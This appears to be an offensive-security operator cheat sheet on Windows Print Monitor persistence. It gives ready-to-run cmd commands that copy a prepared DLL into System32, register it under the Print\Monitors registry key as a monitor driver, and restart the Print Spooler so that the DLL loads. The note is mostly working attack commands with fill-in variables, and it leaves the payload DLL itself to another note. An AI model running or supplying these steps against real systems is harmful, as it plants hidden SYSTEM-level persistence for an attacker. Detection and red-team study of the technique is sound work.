---
technique: Print Monitor Persistence
category: persistence
targets: Windows Print Spooler
protocols: Local, RPC
remote_capable: false
tags: windows persistence print-monitor spooler dll
---

# Print Monitor Persistence

Print monitor persistence registers a monitor DLL that the Print Spooler service loads.

## Prerequisites

| Requirement | Detail |
|-------------|--------|
| Administrative access | Monitor registration and driver paths require admin |
| Spooler running | The Print Spooler service must load the monitor |
| Prepared DLL | Payload construction belongs in a tool or payload note |

## Windows

### Query monitors

#cmd #spooler #registry

List registered print monitors.

```cmd title:"Query print monitors"
reg query "HKLM\SYSTEM\CurrentControlSet\Control\Print\Monitors"
```
<!-- cheat -->

### Step 1: Copy monitor DLL

#cmd #spooler #persistence

Copy a prepared monitor DLL into System32.

```cmd title:"Copy print monitor DLL"
copy "$dll_path" "C:\Windows\System32\$dll_name"
```
<!-- cheat
var dll_path
var dll_name
-->

### Step 2: Create monitor key

#cmd #registry #spooler

Create a print monitor registry key.

```cmd title:"Create print monitor key"
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Print\Monitors\$monitor_name" /f
```
<!-- cheat
var monitor_name
-->

### Step 3: Set monitor driver

#cmd #registry #spooler

Set the monitor driver DLL value.

```cmd title:"Set print monitor driver"
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Print\Monitors\$monitor_name" /v Driver /t REG_SZ /d "$dll_name" /f
```
<!-- cheat
var monitor_name
var dll_name
-->

### Step 4: Stop spooler

#cmd #spooler #services

Stop the Print Spooler service before starting it again.

```cmd title:"Stop Print Spooler"
sc stop Spooler
```
<!-- cheat -->

### Step 5: Start spooler

#cmd #spooler #services

Start the Print Spooler service to load monitor configuration.

```cmd title:"Start Print Spooler"
sc start Spooler
```
<!-- cheat -->

## Linux

No Linux operator command is included here. This note covers Windows print monitor persistence.
